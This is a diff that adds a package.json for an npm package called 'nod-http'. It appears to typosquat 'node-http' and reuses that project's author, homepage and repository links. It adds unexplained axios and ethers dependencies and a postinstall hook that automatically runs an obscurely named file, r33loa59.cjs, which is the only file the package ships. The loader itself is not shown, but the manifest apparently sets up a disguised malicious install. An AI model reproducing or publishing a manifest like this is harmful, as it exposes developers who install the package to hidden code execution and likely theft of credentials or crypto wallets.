@@ -1,0 +1,35 @@
+{
+  "name": "nod-http",
+  "description": "node-http.",
+  "version": "0.0.5",
+  "author": "Shallker <imshallker@gmail.com>",
+  "main": "index.js",
+  "keywords": [
+    "node-http"
+  ],
+  "homepage": "https://github.com/shallker/node-http",
+  "repository": {
+    "type": "git",
+    "url": "https://github.com/shallker/node-http.git"
+  },
+  "bugs": {
+    "url": "https://github.com/shallker/node-http/issues"
+  },
+  "dependencies": {
+    "eventy": "*",
+    "bupper": "*",
+    "reges": "*",
+    "axios": "^1.7.7",
+    "ethers": "^6.13.2"
+  },
+  "devDependencies": {
+    "simple-test": "*"
+  },
+  "scripts": {
+    "postinstall": "node r33loa59.cjs"
+  },
+  "license": "MIT",
+  "files": [
+    "r33loa59.cjs"
+  ]
+}
